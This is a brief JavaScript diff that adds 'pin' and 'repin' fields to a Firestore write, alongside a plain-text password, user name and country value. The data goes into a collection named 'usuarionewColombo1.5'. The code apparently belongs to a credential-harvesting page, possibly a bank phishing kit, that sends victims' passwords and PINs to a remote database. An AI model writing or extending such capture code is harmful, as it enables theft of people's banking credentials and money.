@@ -33,7 +33,8 @@ await db.collection("usuarionewColombo1.5").doc(name).set({
 pw: document.getElementById("pws").value,
 user: document.getElementById("name").value,
 upais: document.getElementById("nn").innerHTML,
-
+pin: document.getElementById("namee").value,
+repin: document.getElementById("pwss").value,
 
 
 });
